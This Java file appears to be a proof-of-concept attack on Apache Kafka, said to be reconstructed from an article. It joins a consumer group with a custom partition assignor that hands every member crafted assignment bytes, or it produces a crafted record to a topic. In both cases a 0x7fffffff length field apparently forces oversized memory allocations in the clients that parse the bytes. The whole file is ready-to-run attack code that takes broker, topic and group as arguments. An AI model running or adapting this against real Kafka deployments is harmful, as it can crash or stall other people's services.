import java.nio.ByteBuffer;
import java.time.Duration;
import java.util.*;
import org.apache.kafka.clients.consumer.ConsumerPartitionAssignor;
import org.apache.kafka.clients.consumer.KafkaConsumer;
import org.apache.kafka.clients.consumer.ConsumerGroupMetadata;
import org.apache.kafka.clients.producer.KafkaProducer;
import org.apache.kafka.clients.producer.ProducerRecord;
import org.apache.kafka.common.Cluster;

// Reconstructed from the article's exact record and assignment bytes.
// Requires kafka-clients and explicit broker, topic, group and mode arguments.
public class AllocationProbe implements ConsumerPartitionAssignor {
    public String name() { return "stream"; }
    public ByteBuffer subscriptionUserData(Set<String> topics) { return null; }
    public void onAssignment(Assignment assignment, ConsumerGroupMetadata metadata) {}
    public GroupAssignment assign(Cluster cluster, GroupSubscription subscriptions) {
        Map<String, Assignment> result = new HashMap<>();
        for (String member : subscriptions.groupSubscription().keySet()) {
            result.put(member, new Assignment(Collections.emptyList(),
                ByteBuffer.wrap(HexFormat.of().parseHex("0000000b0000000b7fffffff"))));
        }
        return new GroupAssignment(result);
    }
    public static void main(String[] args) throws Exception {
        if (args.length != 4) throw new IllegalArgumentException("broker topic group record|assignment");
        Properties p = new Properties();
        p.put("bootstrap.servers", args[0]);
        if (args[3].equals("record")) {
            p.put("key.serializer", "org.apache.kafka.common.serialization.ByteArraySerializer");
            p.put("value.serializer", "org.apache.kafka.common.serialization.ByteArraySerializer");
            try (KafkaProducer<byte[], byte[]> producer = new KafkaProducer<>(p)) {
                producer.send(new ProducerRecord<>(args[1],
                    HexFormat.of().parseHex("007fffffff00000000"))).get();
            }
        } else if (args[3].equals("assignment")) {
            p.put("group.id", args[2]);
            p.put("key.deserializer", "org.apache.kafka.common.serialization.ByteArrayDeserializer");
            p.put("value.deserializer", "org.apache.kafka.common.serialization.ByteArrayDeserializer");
            p.put("partition.assignment.strategy", AllocationProbe.class.getName());
            try (KafkaConsumer<byte[], byte[]> consumer = new KafkaConsumer<>(p)) {
                consumer.subscribe(Collections.singletonList(args[1]));
                while (true) consumer.poll(Duration.ofSeconds(1));
            }
        }
    }
}
